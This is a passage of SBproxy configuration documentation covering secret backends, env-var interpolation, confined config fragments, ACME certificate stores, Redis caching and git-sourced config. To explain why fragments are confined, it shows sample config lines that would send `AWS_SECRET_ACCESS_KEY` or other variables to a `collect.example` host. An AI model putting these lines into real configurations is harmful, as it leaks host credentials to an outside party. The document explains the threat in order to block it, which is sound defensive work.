Rewrite known legacy aliases with:

```bash
sbproxy config migrate sb.yml --out sb.migrated.yml
```

#### Multiple backends

Backends are declared once, at proxy scope, under `proxy.secrets.backends:`. There is no per-tenant or per-origin backend list; the `<backend-name>` segment in a reference URI selects the backend by name, and the scheme requires that backend to have the matching provider type. To keep tenants on separate Vault instances, declare one named backend per instance and reference the right name from each origin.

```yaml
proxy:
  secrets:
    backends:
      - type: hashicorp
        name: acme-vault
        addr: https://vault.acme.example/v1
        auth:
          type: token
          token: ${VAULT_TOKEN_ACME}
      - type: hashicorp
        name: beta-vault
        addr: https://vault.beta.example/v1
        auth:
          type: token
          token: ${VAULT_TOKEN_BETA}
origins:
  api.acme.example.com:
    action:
      type: ai_proxy
      providers:
        - name: openai
          api_key: vault://acme-vault/secret/data/openai-prod?key=api_key
  api.beta.example.com:
    action:
      type: ai_proxy
      providers:
        - name: openai
          api_key: vault://beta-vault/secret/data/openai-prod?key=api_key
```

The `vault://acme-vault/...` reference resolves against the `acme-vault` backend at `vault.acme.example`; the `beta-vault` reference resolves against the other instance. Backend types are `local`, `file`, `hashicorp`, `aws`, `gcp`, `azure`, and `k8s`; see [secrets.md](secrets.md) for each backend's fields and auth methods. An unresolved reference in a secret-bearing field fails startup rather than reaching the wire verbatim.

---

## Environment variables

Reference environment variables anywhere in the config with `${VAR_NAME}` syntax to keep secrets out of config files.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: ${BACKEND_URL}
    authentication:
      type: api_key
      api_keys:
        - ${API_KEY}
```

Environment variables are resolved at config load time. An unset variable leaves the literal `${VAR_NAME}` string in place rather than failing the load.

Common pattern: load variables from `.env` with your shell or Docker:

```bash
export BACKEND_URL=https://backend.internal:8080
export API_KEY=my-secret-key
sbproxy serve -f sb.yml
```

### Confined fragments

`${VAR}` above is resolved by a text pass that runs over the whole
document before anything parses it. That is what makes it work in any
field, and it is also its limit: the pass cannot tell one part of the
document from another, so every byte of the file gets the same
unrestricted read of the proxy's environment.

That is the right trade while the operator who runs the proxy is also
the person who wrote every line of the file. It stops being the right
trade the moment a piece of the document comes from somewhere else, such
as a config fragment a service team commits in its own repository and a
platform team composes into the running config. Handing that team write
access to a fragment would hand them a read of `AWS_SECRET_ACCESS_KEY`,
because a fragment carrying

```yaml
action:
  type: proxy
  url: "https://collect.example/${AWS_SECRET_ACCESS_KEY}"
```

is a URL the proxy builds at compile time and dials at request time.

So a fragment does not get that pass. It gets a confined one, and the
rule is short: **a fragment resolves the inputs its caller binds, and
reaches nothing on the host.** A fragment that reaches anyway fails the
compile with a message naming the fragment and the field, and the
composed config never ships.

Three powers the root config keeps and a fragment does not have, because
all three read a machine the fragment's author does not own:

| Power | Root config | Fragment |
|---|---|---|
| Name a process variable: `${VAR}`, `${VAR:-default}`, `{{env.X}}` | yes | refused, naming the variable |
| Reference a secret the resolver reads off the host: `env:NAME`, `vault://env/NAME`, `file:PATH` | yes | refused, naming the form |
| Name a host path the proxy opens, through any of the config keys listed below | yes | refused, naming the key and what to do instead |

The second row matters as much as the first and is easier to miss.
`api_key: "env:AWS_SECRET_ACCESS_KEY"` contains no `${` and no `{{`, so
no template check anywhere would see it, and the secret resolver reads
it out of the process environment at config load exactly the way
`${AWS_SECRET_ACCESS_KEY}` would. A boundary that stopped only template
syntax would refuse one spelling of an attack and wave through the
other.

The third row is a list of config keys, not a rule about files:

A key written `parent.key` is refused only directly under that parent, a
bare `key` anywhere in the document, and `engines.*.path` under any
engine name you choose.

| Where | Keys |
|---|---|
| Compiled by the pipeline | `rego_module_path`, `module_path`, `spec_file`, `sha1_file`, `transcode.descriptor_set`, `bulk_list.path`, `feed.cache_dir`, `feed.cache_file`, `spec_path`, `argument_policies.path`, `result_policies.path`, `agent_skills.path`, `agent_skills.url` (any value that is not an absolute `http(s)` URL), `action.path` (the `local` storage backend), `tool_versioning.lockfile` |
| Model, tokenizer and rule-pack weights | `model_path`, `tokenizer_path`, `model_signature_path`, `tokenizer_signature_path`, `rule_pack_path`, `onnx_model_path` |
| Extension code | `extensions.bundles_dir`, `sources.path` (a `type: directory` source, and a `type: git` source whose `path` leaves the repository) |
| A binary this node runs | `serve.cache_dir`, `acquire.path`, `lora_adapters.source` (any value that is not an `hf:Org/Repo` reference) |
| Node identity and node state | `tls_cert_file`, `tls_key_file`, `cert_file`, `key_file`, `ca_file`, `client_ca_file`, `tls.cert`, `tls.key`, `authority_dir`, `signing_key_file`, `verifying_key_file`, `verifying_keys_file`, `signing_key.pem_file`, `state_dir`, `state_path`, `store_dir`, `store.path`, `model_host.store_path`, `catalog_file`, `cache.directory`, `engines.*.path`, `socket_path`, `tls_certificate_path`, `jwt_path`, `auth.path`, `service_account_key_file.path`, `external_account_file.path`, `backends.path`, `proxy.ai_providers_file` |
| Durable sinks and evidence | `audit.path`, `audit.config_path`, `audit.key_path`, `audit.admin_path`, `output.path`, `events.path`, `request_events.path`, `session_ledger.path`, `usage_rollups.path`, `usage_sinks.path`, `ledger.path`, `queue.path`, `config_history.dir`, `revocation_store.path`, `cache_path`, `storage_path`, `compression_state.local_path`, `prompt_persistence_path`, `backend.path` |
| Trust anchors and sockets | `acme.ca_root`, `levers.endpoint` (a `unix://` value only) |

Three things about that table.

It is a list, so it is exactly as wide as its entries: a module added
later opens a path the list has never heard of until somebody adds it.
What keeps it honest is a test that walks **every schema this
repository generates** and requires each path-shaped property to be on
this list or on a written allowlist saying why it is not a path on this
host. All six files under `schemas/` are swept, because
`sb-config.schema.json` alone is not the config surface: it leaves
`policies[]`, `action`, `ai` and `proxy.extensions.*` untyped, and five
of those blocks ship a generated schema of their own. That is where
`origins.*.ai.providers[].serve` lives, the block that names an engine
binary this node executes. A property counts as path-shaped when its
name looks like a path **or** its own description says it is a file, a
path, a directory or a socket, because a name-only rule is exactly as
wide as its list of name fragments and `proxy.acme.ca_root` carries
none of them.

It refuses the *document's* choice of path, not the key.
`state_dir: "${SB_STATE_DIR}"` is fine, because the node resolves that
from its own environment and an unset variable fails the compile closed,
while `state_dir: /var/lib/x` and
`state_dir: "${SB_STATE_DIR:-/var/lib/x}"` are both refused, because the
document picked the bytes.

And a `${VAR:-default}` default is document text everywhere, not only on
these keys. The pre-parse pass makes the default the value whenever the
variable is unset, so the whole document is checked a second time with
its own defaults filled in: `"${SB_NOPE:-path}"` in key position becomes
the key `path` and meets this table, and
`"${SB_NOPE:-env:AWS_SECRET_ACCESS_KEY}"` in value position becomes a
host-backed secret reference and meets the row above it. A default that
is itself a secret reference, or an absolute or `~`-relative path, is
refused wherever it appears, which also refuses a URL path written as
`${SB_PREFIX:-/v1}`: write the literal, or write `${SB_PREFIX}` with no
default and export it on the node.

Keys that take the *name* of an environment variable rather than its
value (the WAF feed's `signature_key_env` and `auth_token_env`, the MCP
action's and the semantic-constraint policy's `api_key_env`) are
deliberately not on it: the value never reaches the document or a
response, and naming the variable is the only way to configure the
feature at all.

A reference to a backend the operator declared under `proxy.secrets`
(`secret://acme/openai`, `vault://acme-vault/openai`, `awssm://...`)
stays available to a fragment. Those resolve only against backends named
in the root config, and `proxy.secrets` is not a path a fragment or an
authority may set, so the operator still decides what they reach. One
exception, below: an extension bundle manifest does not get even those
for a config value it authored itself, because the resolved secret lands
in config that guest code reads.

Helm draws the boundary the same way. Chart authors get every function
in the Sprig library except `env` and `expandenv`, which were removed
because they would have let a third-party chart read the environment of
the process rendering it; a chart parameterizes itself through
`.Values`, which the person installing it supplies. Kubernetes draws it
one layer down, where a container sees the variables its Pod spec
enumerates and never the kubelet's.

Binding an input is strictly more expressive than allowing a variable
name, which is the other common design (decK, for instance, lets a state
file read process variables that carry a `DECK_` prefix). A fragment
that names `${DATABASE_URL}` has decided where the value comes from. A
fragment that names the input `database_url` has not, so the operator
can bind it from the environment on one deployment, from Vault on
another, and from a literal in a test, without the fragment changing.

#### What resolves and what is refused

```mermaid
flowchart TD
    A["a placeholder in a config fragment"] --> B{"which form?"}
    B --> V["{{vars.X}} or {{variables.X}}"]
    B --> E["${VAR} or ${VAR:-default}"]
    B --> T["{{env.X}}"]
    B --> S["$${VAR}"]
    B --> R["${args.x}, ${steps.x.y}, ${method}"]
    B --> Q["{{request.x}}"]
    V --> C{"bound by the caller?"}
    C -->|yes| OK["resolved from the binding"]
    C -->|no| N1["refused, naming X and the field"]
    E --> N2["refused, naming VAR and the field,\nin every field including script bodies,\nand in mapping keys"]
    T --> N3["refused, naming X and the field"]
    S --> L1["left literal: the documented escape"]
    R --> L2["left literal: runtime vocabulary"]
    Q --> L3["left literal: bound per request"]
```

Two details in that diagram are worth spelling out, because both are
places a narrower rule would leak.

A `${VAR}` inside a `lua_script`, `js_script`, or `rego_module` body is
refused like any other. Script bodies are exempt from the `{{ }}`
interpolator, so a literal `{{` in a Lua string reaches the engine as
written, but the pre-parse text pass has no such exemption and would
substitute inside one. Write `$${VAR}` if a script genuinely needs those
five characters, and note that the `$$` stays in the value.

A `${VAR}` in a mapping *key* is refused too. The text pass substitutes
into a key as readily as into a value, so a fragment could otherwise
name a header after a credential.

#### A worked fragment

Take a fragment that a service team owns, with two inputs it expects the
platform to bind:

```yaml
action:
  type: proxy
  url: "https://{{vars.upstream_host}}/v1"
request_modifiers:
  - headers:
      set:
        X-Upstream-Pool: "{{vars.pool}}"
transforms:
  - type: lua
    lua_script: |
      -- no substitution runs in here, so a literal `{{` is safe
      local tpl = "${args.request_id}"
      return tpl
```

Bound with `upstream_host: orders.internal` and `pool: orders-primary`,
it resolves to `https://orders.internal/v1`, an `X-Upstream-Pool` header
of `orders-primary`, and a Lua body byte-for-byte unchanged.

**`{{vars.X}}` substitutes text, so it parameterizes string-typed fields
only.** A binding of `200` written into `requests_per_second:` produces
the YAML string `'200'`, and `rate_limiting` deserializes that field as
a number, so the composed config compiles and then fails at module
construction with `invalid type: string`. This is inherited from the
fleet-wide interpolator rather than introduced by confinement, and it is
the reason the example above parameterizes a header value rather than a
limit. Parameterize a numeric field by binding the whole block, or leave
the number in the platform's own defaults.

Three ways the same fragment can be refused instead:

| What the fragment writes | What happens |
|---|---|
| `url: "https://{{vars.upstream}}/v1"` with only `upstream_host` and `pool` bound | refused, naming `upstream` and `action.url`, and listing the input names that *are* bound |
| `authentication: { api_key: "${OPENAI_API_KEY}" }` | refused, naming `OPENAI_API_KEY` and `authentication.api_key` |
| a request modifier setting `X-Region: "{{env.AWS_REGION}}"` | refused, naming `AWS_REGION` and `request_modifiers.0.headers.set.X-Region` |
| `authentication: { api_key: "env:OPENAI_API_KEY" }` | refused, naming the form `env:NAME` and `authentication.api_key`. The message does not repeat the variable name: the author wrote it, and echoing it is one paste away from a log line that names a credential |
| `request_modifiers: [ { rego_module_path: /etc/sbproxy/x.rego } ]` | refused, naming `request_modifiers.0.rego_module_path` and pointing at `rego_module` for the inline form |

None of those messages carries the variable's value, because nothing on
the confined path reads one.

#### What this does not change

Everything above the fragment boundary keeps today's behavior. A config
file the operator wrote resolves `${VAR}` and `${VAR:-default}` exactly
as [Environment variables](#environment-variables) describes, in every
field. A config authority still reports the `${VAR}` references a
publish leaves unresolved, and a subscriber still refuses to apply a
bundle that leaves one unresolved on its own node rather than shipping
the literal text as a value. A confined fragment never trips either,
because it cannot carry one.

One asymmetry worth knowing before you move YAML across the boundary.
In a fragment, `{{vars.X}}` resolves in **every** string. In a root
`sb.yml` the fleet-wide interpolator runs over `action`,
`authentication`, `policies`, `transforms`, `filters`, `forward_rules`,
`fallback_origin`, error-page bodies and modifier header values, and
nowhere else. A fragment that parameterizes `hostname:` therefore works,
and the same block pasted into a root config ships the literal braces
with no error. The wider scope in a fragment is deliberate, since a
fragment's inputs are the only thing its author can parameterize; the
narrower one in a root config is long-standing behavior this change did
not touch.

#### Whole documents from somewhere else

A fragment is not the only config text an operator does not write by
hand. Three more arrive from another party, and all of them go through
the same resolver:

- **A config-authority bundle**, screened when the authority validates a
  publish and again when a subscriber merges one, so a payload cannot
  pass the authority and then be refused by the whole fleet at once.
- **An extension bundle's own config values**. A bundle manifest can
  declare a default for a config var and list that var in `secret_vars`,
  which would have the host resolve a secret the bundle chose, into
  config that guest code reads. A value the *bundle* authored resolves
  nothing at all, not even a `secret://` reference to a backend you
  declared; a value *you* wrote in `sb.yml` for the same key resolves
  exactly as before. A signature on the bundle does not change this: it
  says the bytes are the ones that author published, not that you agreed
  to what they say.
- **A git-sourced document** whose `source:` block sets
  `confine: true`. Whoever can push to that repository writes the
  document, and this is how you say that is somebody else.

The first and the last keep `${VAR}`: naming per-node values in one
shared document is the documented pattern for running a fleet, and
taking it away would break every git-sourced deployment on upgrade.
They lose the other two powers in the table above. `merge_config`'s deny
list already reasons this way at the path level, refusing an authority
any claim on `proxy.secrets` because the node owns its own secret
backends; sealing `env:`, `vault://env/` and `file:` applies that same
rule inside the values, which is where a path-level deny list cannot
reach.

Two things that leaves open, stated rather than implied.

A remote document may still write
`url: "https://collect.example/${SOME_VAR}"` and have each node
substitute its own value. The existing gate only refuses a `${VAR}` that
fails to resolve. Closing that needs the node operator to declare which
variable names a remote document may name, which is a config key this
change does not add. That residual reaches further than the document
itself: `${VAR}` is substituted over the whole text before the parse, so
a remote document can put one in an extension bundle's attachment config
and the resolved value is handed to guest code, which is the outcome the
bundle-manifest rule above exists to prevent, reached from the other
side.

And the host-path half is the list of config keys in the table above,
not a rule about files. A module added later opens whatever path its own
config key names, and the list has never heard of it until somebody adds
it. Two shapes it cannot express today: a key that is a host path only
when a sibling key says so (`action.path` is refused whatever `backend:`
says), and a key whose parent scope is a coincidence rather than a
contract.

Composition itself is still being built, so nothing in a stock `sb.yml`
supplies a fragment yet. The boundary is documented here because it is
the rule fragments will be held to, and because the same change made
`sbproxy config print` and `sbproxy mcp lock` resolve `${VAR}` through
the compiler's own pass rather than a near-copy of it: `$${VAR}` now
stays literal in both, `${VAR:-default}` resolves to its default, and
the MCP `${args.x}` and `${steps.x.y}` forms are left for the tool
executor instead of being substituted at load.


---

## ACME / auto TLS

SBproxy can automatically provision and renew TLS certificates using the ACME protocol (Let's Encrypt or any ACME-compatible CA). One node or a fleet, the proxy answers the `http-01` challenge on its own listener, obtains the certificate, and renews it before expiry.

Two limits worth knowing before you build on it. `http-01` is the only challenge type the proxy drives, so wildcard names are out: Let's Encrypt issues those only over DNS-01. And a fleet needs a shared certificate store, for issuance and for answering the challenge; [HTTP-01 behind a load balancer](#http-01-behind-a-load-balancer) below is that mechanism in full.

On Kubernetes, prefer [cert-manager](https://cert-manager.io/) and terminate TLS at the Ingress rather than enabling this block. It solves challenge routing where the routing already happens, it does DNS-01 and therefore wildcards, and it is what the cluster is already running. [kubernetes.md](kubernetes.md#tls-certificates) has the worked example and the cases on Kubernetes where this block is still the right call.

### Production setup (Let's Encrypt)

```yaml
proxy:
  http_bind_port: 80
  https_bind_port: 443
  acme:
    enabled: true
    email: admin@example.com
    storage_path: /var/lib/sbproxy/certs

origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    force_ssl: true
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | false | Master switch for ACME-managed TLS |
| `email` | string | | Account contact email registered with the ACME directory |
| `directory_url` | string | Let's Encrypt production | ACME directory URL |
| `challenge_types` | list | `[http-01]` | Allowed challenge types in priority order. Only `http-01` is driven today. |
| `storage_backend` | string | `redb` | Where issued certs live: `redb` (local file, default), `sqlite`, `file`, `redis`, `s3`, `gcs`, `azure`, or `memory`. Any other value is a config error. See below. |
| `storage_path` | string | `/var/lib/sbproxy/certs` | The store's location: a directory (`redb`, `sqlite`, `file`), a `host:port` (`redis`), or a URL like `s3://bucket/prefix` (`s3`/`gcs`/`azure`) |
| `renew_before_days` | int | 30 | Days before expiry to attempt renewal |

#### Certificate store backends

A single node keeps its certificates in a local `redb` file (the default), so a restart reuses the cert instead of asking the CA for a fresh one. A fleet behind a load balancer needs a shared store, or every node issues its own cert and runs into the CA's rate limits. Point `storage_backend` at a shared store and the nodes coordinate: whichever one wins a per-hostname issuance lease issues the certificate, and the rest read it back and hot-install it without a restart. A replica that was waiting on the lease installs the winner's certificate within seconds of publication; a replica that already held a valid certificate picks up a peer's renewal on its next renewal tick (every 12 hours, well inside the 30 day renewal window). The certificate, its private key, and its metadata are published as one atomic record, so no replica can observe a certificate paired with the previous generation's key.

| Backend | `storage_path` | Use |
|---|---|---|
| `redb` | a directory | single node (default); survives restarts |
| `sqlite` | a directory | single node; survives restarts |
| `file` | a shared directory | a fleet on shared storage (NFS/EFS) |
| `redis` | `host:port` | a fleet with Redis |
| `s3`, `gcs`, `azure` | `s3://bucket/prefix`, `gs://bucket/prefix`, `az://...` | a fleet on object storage; credentials come from the environment |
| `memory` | ignored | tests only; nothing persists |

Anything outside that list is rejected. `sbproxy plan` reports it as `unknown-acme-storage-backend` and the proxy refuses to start on it, rather than falling back to an in-memory store that would re-issue every certificate on every restart.

**A configured backend that cannot be opened.** Naming a valid backend is not the same as being able to open it: a Redis DSN can be malformed, a bucket URL can be unparseable, a shared directory can be unmounted. What happens next depends on which half of the table you are in.

A shared backend (`file`, `redis`, `s3`, `gcs`, `azure`) that cannot be opened refuses to start, and the error names the backend. This is not about persistence. The in-memory store the proxy used to fall back to has no cross-node lock at all, so every replica wins its own issuance lease: three replicas open three orders for the same hostname and publish three HTTP-01 tokens to three stores no peer can read, roughly two thirds of the CA's validation fetches land on a replica that has never seen the token, and the account burns through Let's Encrypt's limit of five duplicate certificates per hostname set per week. A pod that will not start is the cheaper failure.

A pod-local backend (`redb`, `sqlite`, `memory`) still falls back to in-memory, because a single node has nothing to be mutually excluded from. It is no longer quiet about it: the log line is at `error` and names the backend, and `sbproxy_cert_store_degraded{backend="..."}` goes to `1`. `SBPROXY-CERT-STORE-DEGRADED` in `deploy/alerts/alerting-rules.yml` is the shipped ticket-tier alert on that condition, and the "Certificate Store Degraded" panel on the `sbproxy-security` dashboard is the read. The cost is real, which is that every certificate is re-issued on every restart. The same gauge reads `0` when the configured backend opened. It is published only by a proxy that has an `acme` block at all, so on a fleet where ACME is on everywhere an absent series is a proxy that never started rather than a healthy one, and on a mixed fleet it is that or a proxy with no ACME configured. Scope the alert to the proxies you expect to issue certificates.

The shared backends hold the issuance lease as an atomic create, and the holder renews it every 20 seconds for as long as the CA takes. A node that crashes mid-issue does not wedge the others: the lease stops being renewed, expires after 120 seconds, and another node takes over with a conditional write, so two nodes racing the same expired lease see exactly one winner. Every takeover carries a fencing generation, and publication is checked against it, so a node that stalled past its lease and lost it cannot overwrite its successor's certificate however late its own order finishes.

#### HTTP-01 behind a load balancer

The store carries the challenge as well as the certificate, and that is the part that decides whether issuance works at all.

The CA validates by fetching `http://<hostname>/.well-known/acme-challenge/<token>` on port 80. Your load balancer sends that request to whichever replica it likes, which is almost never the replica holding the issuance lock. So the node driving the order publishes the token to the cert store under `acme:challenge:<token>`, and every node answers the challenge by reading from there. A replica that never touched the order still serves the right bytes.

The CA decides how long that token stays answerable. RFC 8555 §7.1.4 gives every authorization an `expires` field, and the published record is stamped to expire with the authorization it satisfies, so there is no fixed TTL to configure. The server's answer is bounded at both ends. The floor is one minute, so a host whose clock runs ahead of the CA's cannot publish a token that is already dead on arrival. The ceiling is ten minutes, which covers the slowest healthy order and falls well short of the seven days Let's Encrypt reports on a pending authorization. Taking those seven days literally would leave a token answerable across the whole fleet for a week whenever a node dies mid-order, and no healthy order has any use for it. An authorization that arrives with no `expires` at all gets the ten minute ceiling.

Two things follow from that. Every replica has to share one `storage_backend`: two proxies behind one load balancer on separate local stores cannot finish an HTTP-01 order no matter how the rest is configured. And `http_bind_port` has to stay reachable on port 80 for the whole fleet, not only for the node you expect to do the issuing.

Kubernetes has its own version of this problem, including where the local store actually lives and an operator that refuses to reconcile a multi-replica `SBProxy` onto a pod-local store. See [kubernetes.md](kubernetes.md#running-dataplane-acme-on-kubernetes-anyway).

### Local development (Pebble)

Pebble is a test ACME server suitable for local development. Point `directory_url` at it:

```yaml
proxy:
  http_bind_port: 8080
  https_bind_port: 8443
  acme:
    enabled: true
    email: test@example.com
    directory_url: https://pebble:14000/dir
    storage_path: /tmp/certs
```

---

## Redis integration

Redis has two roles in SBproxy: distributed caching and shared state through the
general L2 store, plus real-time messaging for config sync and cache
invalidation. Both blocks are nested under `proxy`, but they use separate
connection implementations. The verified TLS, authentication, database, and
client-certificate contract in this section applies to `l2_cache_settings`.

### L2 cache (distributed rate limiting and caching)

```yaml
proxy:
  l2_cache_settings:
    driver: redis
    params:
      dsn: rediss://cache-user:${REDIS_PASSWORD_URLENCODED}@redis.internal:6380/7
      ca_file: /etc/sbproxy/redis/ca.pem
      cert_file: /etc/sbproxy/redis/client.pem
      key_file: /etc/sbproxy/redis/client-key.pem
```

When configured, rate limit counters are shared across all proxy instances.
Response cache entries can also be stored in Redis for shared caching. The
deserializer accepts `l2_cache:` as an alias. See
[`l2_cache_settings`](#l2_cache_settings) for legacy address compatibility,
verified TLS, credential encoding, database selection, startup validation, and
lazy connection behavior. The runnable
[`redis-l2-secure`](../examples/redis-l2-secure/) example exercises private-CA
verification, client mTLS, password authentication, and database 7.

### Getting config changes to every replica

There is no message bus. `proxy.messenger_settings` is refused at load; see
[messenger_settings](#messenger_settings) for why and for the migration.

Fleet configuration distribution is `proxy.config_authority`: one node signs
and serves a configuration bundle, the others pull it on an interval, verify
the signature, and apply it. See
[Config authority](#config-authority-fleet-configuration-distribution).

### Full shared-state setup

```yaml
proxy:
  http_bind_port: 8080
  https_bind_port: 8443
  l2_cache_settings:
    driver: redis
    params:
      dsn: rediss://cache-user:${REDIS_PASSWORD_URLENCODED}@redis.internal:6380/7
      ca_file: /etc/sbproxy/redis/ca.pem
      cert_file: /etc/sbproxy/redis/client.pem
      key_file: /etc/sbproxy/redis/client-key.pem

origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    policies:
      - type: rate_limiting
        requests_per_minute: 100
    response_cache:
      enabled: true
      ttl_secs: 300
```

Every replica pointed at that Redis tier shares one set of rate-limit counters
and one set of cached responses. That also makes invalidation a single call:
`POST /admin/cache/purge` against any replica removes the entry from the shared
tier, so there is nothing to broadcast.

---

## Config source (GitOps)

The top-level `source:` block says where the configuration document comes from. Without it, the file you hand the binary *is* the configuration, which is the historical behavior and still the default. With it, that file is a pointer and the document it names is what compiles, boots, and serves traffic.

Earlier releases parsed this block, published it in the JSON Schema, and then ignored it: a proxy configured with `source: {kind: git}` started clean and quietly served whatever was in the local file. That is fixed. The block is honored at boot, on every reload, on a refresh timer, and by `sbproxy validate` and `sbproxy plan`. A `source:` block that cannot be resolved now stops the proxy starting instead of being skipped.

```yaml
source:
  kind: git
  repo: https://github.com/acme/sbproxy-config.git
  revision: main                  # branch, tag, or a full commit sha
  path: production/sb.yml
  credential: env:SB_GIT_TOKEN    # private repositories only
  verify_signature: false
  confine: false                  # true when somebody else writes this repository
  timeout_secs: 60
  refresh_interval_secs: 60
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `kind` | enum | required | `local` (the file is the config, same as omitting the block), `git`, or `git_overlay`. |
| `repo` | string | required for `git` | Any URL `git clone` accepts. `https` and `ssh` both work. |
| `revision` | string | default branch | A branch, a tag, or a full 40- or 64-character commit sha. A full sha is a pin, see below. |
| `path` | string | required for `git` | Path to the config file inside the repository. Relative, and `..` components are refused: this names a file in the repository, not a file on the proxy host. |
| `credential` | secret ref | | `env:NAME`, `${NAME}`, `file:/path`, or `secret://backend/name`. An inline literal is refused. |
| `verify_signature` | bool | `false` | Require a verifiable signature on the resolved tag or commit. |
| `confine` | bool | `false` | Treat the fetched document as externally authored: no `env:NAME`, `file:PATH` or `vault://env/NAME` secret reference, and no config key naming a path this document chose on the proxy host. Per source leaf, so each `git` node in a `git_overlay` carries its own. See [Confined fragments](#confined-fragments). |
| `timeout_secs` | int | `60` | Hard timeout for one fetch, 1 to 3600. A `git` child, or the in-process clone, is stopped when it expires. |
| `refresh_interval_secs` | int | `60` | How often to re-resolve while running. `0` resolves at boot and on ordinary reloads only. |

### What a git source proves, and what it does not

Transport trust: HTTPS plus whatever the git host authenticated the fetch as. There is no signature over the document and no provenance beyond "the remote served this". That is the same guarantee every GitOps tool offers and it is a reasonable place to stand, but it is **not** the guarantee a [signed config bundle](#config-authority-fleet-configuration-distribution) carries. If someone can write to the repository, or to the branch, they can change what your proxies run.

Two settings close most of that gap, and both are yours to choose:

- **Pin `revision` to a full commit sha.** After fetching, SBproxy resolves `HEAD` and refuses the document when it is not the commit you named. A branch moving underneath a pinned node cannot be followed silently, and a pinned node never reloads on someone else's push.
- **Set `verify_signature: true`.** The resolved tag is checked first, then the commit, and a missing or unverifiable signature refuses the document. The signing key has to be in the git trust store on the proxy host.
- **Set `confine: true`** when the repository is written by somebody other than whoever runs the proxy. The fetched document then loses the two powers a document authored elsewhere was never granted: a secret reference that reads this host directly (`env:NAME`, `file:PATH`, `vault://env/NAME`) and a config key that names a path on this host for the proxy to open. `${VAR}` still resolves, because that is how one shared document names per-node values.

  It is off by default on purpose: turning it on for everybody would be a fail-closed upgrade. Every GitOps repository that names a host path anywhere in its document would refuse its own config on the release that changed the default, and a node that boots into a refusal serves nothing. That is a decision you take, on a repository you know is written by somebody else, not one a release takes for you.

  It is not silent while it is off. A git source whose document reaches for this host logs one warning naming the first finding, at boot and again whenever a refresh brings a revision this process has not already checked, naming the source and the key and never the value, with a pointer to this setting. That is the answer to "what would `confine: true` refuse if I turned it on". First rather than every: the check stops at the first thing it refuses, so a document that names both a host path and an `env:` reference reports one of them now and the other once you fix it.

  A secret still has a spelling under it. `${VAR}` survives confinement, so `shared_key: "${SB_CLUSTER_SHARED_KEY}"` and any other secret-bearing field can name a variable your node exports; an unset variable fails the compile closed. What confinement takes away is `env:NAME`, `file:PATH`, `vault://env/NAME` and the host-path keys, so a document that uses those has to move them into a layer this node owns: the pointer file, through a `kind: git_overlay` source whose `base` is `kind: local`, which is the one arm that merges the local file's own content rather than discarding it.

  `confine` is per source leaf, not per tree. A `git_overlay` resolves each `kind: git` node with its own setting, so an overlay you left unconfined keeps its own powers and warns on its own.

### How a git source is fetched

Resolution prefers the `git` binary on `PATH` and falls back to an in-process clone when that binary is missing. Distroless images have no git and no shell; the fallback is what a git-sourced config uses there. `sbproxy doctor` still reports the binary so you can see which path a host will take:

```text
tooling
  git         /usr/bin/git (git version 2.43.0)
```

`verify_signature: true` always needs `git`, because GPG and SSH signature verification are not in the in-process path. A missing binary with signature verification set is a named failure rather than a confusing clone error.

One implementation note, because it changes what your git server has to allow: `git clone --depth 1` cannot fetch an arbitrary commit sha unless the server sets `uploadpack.allowReachableSHA1InWant`. Pinning to a sha therefore fetches the single commit when the server allows it and falls back to a full fetch when it does not. Pinning works either way; on a server without that setting it costs a full clone.

### Refresh

The resolved commit is the change detector. Each cycle re-resolves the source and compares: an unchanged commit means no recompile and no reload, exactly the way an unchanged `ETag` ends an authority poll. A moved commit compiles and applies through the same three-phase reload transaction a SIGHUP takes, so a document that does not compile leaves the previous configuration serving.

The interval carries jitter, so a fleet that restarts together does not hit your git host in lockstep. The apply step never waits for the reload lock: another reload in flight skips the cycle and the next interval retries, rather than queueing up cycles for a commit that has since been superseded.

| Situation | Behavior |
|---|---|
| Remote unreachable | Keep serving the document already applied. Error log, `unreachable` counter. |
| Fetch exceeded `timeout_secs` | The fetch is cancelled (the `git` child is killed; the in-process fallback stops cooperatively). Keep serving. `timeout`. |
| `revision` pins a sha and `HEAD` is a different commit | Refuse the document. `revision_mismatch`. |
| `verify_signature` set and no verifiable signature | Refuse the document. `verify_failed`. |
| `confine` set and the document reaches for this host | Refuse the document. `confinement_refused`. |
| `confine` unset and the document reaches for this host | Serve it, and warn once naming the source and the first finding. |
| Resolved document does not compile or cannot be constructed | Refuse the document. `compile_failed`. |
| Another reload in flight | Skip the cycle. `reload_busy`. |
| This node is pinned to a fallback configuration | Skip the cycle, and say which commit is being held back. `suspended`. |
| Resolved commit unchanged | Nothing at all. `not_modified`. |

**Observability.** `sbproxy_config_source_fetch_total{kind,result}` counts one label per cycle, and `sbproxy_config_source_revision_info{sha}` carries the commit currently serving as a label with a constant value of `1`, so you can join "which config" onto every other series from that node.

**Drift.** `GET /admin/drift` answers "has the local file changed since we read it?", so on a git-sourced node both sides of that comparison are the pointer file and drift stays `false` while the repository moves. Whether the *source* moved is what `sbproxy_config_source_revision_info` answers.

### Node identity in a shared repository

One repository pointed at by a whole fleet cannot carry `proxy.cluster` as written. Nearly every field in that block is a per-node fact, and changing any of them rejects the entire reload, so either every node claims the same `node_id` or the repository omits the block and every clustered node hard-fails.

**The supported pattern is `${VAR}` interpolation.** The shared document names the per-node values and each host exports them:

```yaml
# in the repository, shared by the whole fleet
proxy:
  cluster:
    cluster_id: prod-eu
    node_id: ${SB_NODE_ID}
    advertise_addr: ${SB_ADVERTISE_ADDR}:7946
    roles: [gateway, worker]
```

Environment is the natural carrier in containers and Kubernetes, which is where a shared repository is most likely, and it needs no second document to keep in sync.

Anywhere else in the config, an unresolved `${VAR}` is a warning and stays as literal text. **Under `proxy.cluster` in a resolved source document it is a hard failure**, because a host that forgot to export its node id would otherwise join the cluster under the literal string `${SB_NODE_ID}` and collide with every other host that forgot the same thing:

```text
the resolved config source leaves node-local reference(s) unresolved:
proxy.cluster.node_id: ${SB_NODE_ID}. These identify this node, so the literal
placeholder text cannot be used as a value: export the environment variable(s)
on this host, or move the value into a node-local overlay
```

If a repository document changes the cluster fingerprint on a running node, the reload refusal now names the fields rather than saying only that something changed:

```text
process-owned cluster configuration changed and cannot be applied to a running
process (changed field(s): proxy.cluster.node_id, proxy.cluster.seeds); restart
sbproxy to adopt it.
```

